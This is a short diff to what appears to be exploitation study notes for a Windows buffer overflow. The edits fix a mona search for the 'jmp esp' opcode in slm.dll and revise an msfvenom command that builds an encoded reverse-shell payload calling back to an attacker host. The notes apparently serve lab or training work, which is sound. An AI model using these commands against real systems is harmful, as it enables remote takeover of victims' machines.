@@ -56,10 +56,10 @@ nasm> jmp esp
 ```
 ## search instructions using mona
 ```
-!mona find -s "\xff\xa4" -m slm.dll
+!mona find -s "\xff\xe4" -m slm.dll
 ```
 
 ## Generate shell code
 ```
-msfvenom -p windows/shell_reverse_tcp LHOST=<attacker_IP> LPORT=4444 EXITFUNC=thread -f c -a x86 --platform windows -b “\x00”
+msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.42 LPORT=443 EXITFUNC=thread -f c -a x86 --platform windows -b “\x00\x0a\x0d” -e shikata_ga_nai
 ```
